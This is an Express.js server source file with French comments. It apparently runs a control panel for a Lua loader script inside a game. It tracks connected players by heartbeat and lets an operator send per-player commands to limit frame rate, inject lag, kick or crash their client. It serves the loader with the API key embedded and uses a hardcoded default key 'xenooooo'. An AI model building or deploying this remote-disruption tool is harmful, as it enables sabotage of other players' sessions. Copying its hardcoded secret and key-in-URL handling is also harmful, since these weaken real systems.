import express from 'express';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import cookie from 'cookie';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.set('trust proxy', 1);

// //api/... (double slash) ne doit pas tomber sur la page login
app.use((req, _res, next) => {
    if (req.url.includes('//')) req.url = req.url.replace(/\/{2,}/g, '/');
    next();
});

app.use(express.json({ limit: '5mb' }));

const API_KEY = process.env.API_KEY || "xenooooo";
const SITE_PASSWORD = process.env.SITE_PASSWORD || "";
const SESSION_COOKIE = "site_session";
const SESSION_MAX_AGE = 7 * 24 * 60 * 60; // 7 jours
const TTL_MS = 15000;

const sessions = new Set();

const getSessionToken = (req) => {
    const cookies = cookie.parse(req.headers.cookie || "");
    return cookies[SESSION_COOKIE] || null;
};

const isAuthed = (req) => {
    const token = getSessionToken(req);
    return token && sessions.has(token);
};

const setSessionCookie = (res, token) => {
    const secure = process.env.NODE_ENV === "production";
    res.setHeader(
        "Set-Cookie",
        cookie.serialize(SESSION_COOKIE, token, {
            httpOnly: true,
            path: "/",
            sameSite: "lax",
            maxAge: SESSION_MAX_AGE,
            secure,
        })
    );
};

const clearSessionCookie = (res) => {
    res.setHeader(
        "Set-Cookie",
        cookie.serialize(SESSION_COOKIE, "", {
            httpOnly: true,
            path: "/",
            sameSite: "lax",
            maxAge: 0,
            secure: process.env.NODE_ENV === "production",
        })
    );
};

const needsSiteAuth = (pathname) => {
    if (pathname === "/login") return false;
    if (pathname.startsWith("/api/")) return false;
    if (pathname === "/loader.lua") return false;
    return true;
};

const players = new Map();
const commands = new Map();

// Nettoyage des joueurs inactifs
setInterval(() => {
    const cutoff = Date.now() - TTL_MS;
    for (const [id, p] of players) {
        if ((p.lastHeartbeat || 0) < cutoff) players.delete(id);
    }
}, 5000);

// Middleware d'authentification (protège par X-Api-Key)
const auth = (req, res, next) => {
    const k = req.header("X-Api-Key") || req.query.key;
    if (k !== API_KEY) return res.status(401).json({ error: "unauthorized" });
    next();
};

const requireSiteAuth = (req, res, next) => {
    if (isAuthed(req)) return next();
    return res.status(401).json({ error: "unauthorized" });
};

const listPlayers = () =>
    Array.from(players.values()).map((p) => ({
        ...p,
        online: Date.now() - (p.lastHeartbeat || 0) < TTL_MS,
    }));

const applyCommand = (req, res) => {
    const b = req.body || {};
    const id = String(b.user_id || "");
    if (!id) return res.status(400).json({ error: 'missing user_id' });
    const cur = commands.get(id) || { fps_limit: false, lag_n: false, lag_c: false };
    const next = { ...cur };
    if (typeof b.fps_limit === 'boolean') next.fps_limit = b.fps_limit;
    if (typeof b.lag_n === 'boolean') next.lag_n = b.lag_n;
    if (typeof b.lag_c === 'boolean') next.lag_c = b.lag_c;
    if (b.kick) next.kick = true;
    if (b.crash) next.crash = true;
    commands.set(id, next);

    if (b.kick || b.crash) {
        setTimeout(() => {
            const c = commands.get(id);
            if (c) { delete c.kick; delete c.crash; commands.set(id, c); }
        }, 60000);
    }
    res.json({ ok: true });
};

// --- ROUTES POUR LE SCRIPT LUA ---

// Le lua envoie le heartbeat ici
app.post('/api/public/heartbeat', auth, (req, res) => {
    const b = req.body || {};
    if (!b.user_id) return res.status(400).json({ error: 'missing user_id' });
    players.set(String(b.user_id), { ...b, lastHeartbeat: Date.now() });
    res.json({ ok: true });
});

// Le lua récupère ses commandes ici
app.get('/api/public/command', auth, (req, res) => {
    const id = String(req.query.user_id || "");
    res.json(commands.get(id) || { fps_limit: false, lag_n: false, lag_c: false });
});

// --- ROUTES POUR LE DASHBOARD (VISUEL) ---

app.get('/api/public/players', auth, (req, res) => {
    res.json({ players: listPlayers() });
});

app.get('/api/players', auth, (req, res) => {
    res.json({ players: listPlayers() });
});

app.get('/api/dashboard/players', requireSiteAuth, (req, res) => {
    res.json({ players: listPlayers() });
});

app.get('/api/command_state', auth, (req, res) => {
    const id = String(req.query.user_id || "");
    res.json(commands.get(id) || { fps_limit: false, lag_n: false, lag_c: false });
});

app.get('/api/dashboard/command', requireSiteAuth, (req, res) => {
    const id = String(req.query.user_id || "");
    res.json(commands.get(id) || { fps_limit: false, lag_n: false, lag_c: false });
});

app.post('/api/command', auth, applyCommand);
app.post('/api/dashboard/command', requireSiteAuth, applyCommand);

app.post('/api/public/command', auth, applyCommand);

// --- AUTH SITE (login.html + SITE_PASSWORD) ---

app.get("/api/auth/status", (req, res) => {
    if (isAuthed(req)) return res.json({ ok: true });
    res.status(401).json({ error: "unauthorized" });
});

app.post("/api/auth/login", (req, res) => {
    if (!SITE_PASSWORD) {
        return res.status(503).json({ error: "not configured" });
    }

    const password = String(req.body?.password || "");
    if (password !== SITE_PASSWORD) {
        return res.status(401).json({ error: "invalid" });
    }

    const token = crypto.randomBytes(32).toString("hex");
    sessions.add(token);
    setSessionCookie(res, token);
    res.json({ ok: true });
});

app.post("/api/auth/logout", (req, res) => {
    const token = getSessionToken(req);
    if (token) sessions.delete(token);
    clearSessionCookie(res);
    res.json({ ok: true });
});

app.get("/login", (req, res) => {
    if (isAuthed(req)) return res.redirect("/");
    res.sendFile(path.join(__dirname, "login.html"));
});

// --- ROUTE POUR DISTRIBUER LE LOADER.LUA ---
app.get('/loader.lua', (req, res) => {
    const proto = req.header('x-forwarded-proto') || req.protocol;
    const host = req.get('host');
    const base = `${proto}://${host}`.replace(/\/+$/, '');

    const templatePath = path.join(__dirname, 'loader.template.lua');
    try {
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace('__BASE__', base).replace('__KEY__', API_KEY);
        res.type('text/plain').send(template);
    } catch (e) {
        console.error('loader.template.lua missing:', e.message);
        res.status(500).type('text/plain').send('-- loader.template.lua missing on server, redeploy the project');
    }
});

// --- SERVIR LE DASHBOARD REACT (Le Visuel) ---
app.use((req, res, next) => {
    if (!needsSiteAuth(req.path)) return next();
    if (isAuthed(req)) return next();
    return res.redirect("/login");
});

app.use(express.static(path.join(__dirname, 'dist')));

// On place le Dashboard à la fin avec une fonction qui exclut les routes API et Loader
app.get(/^(?!\/api|\/loader\.lua|\/login).*$/, (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
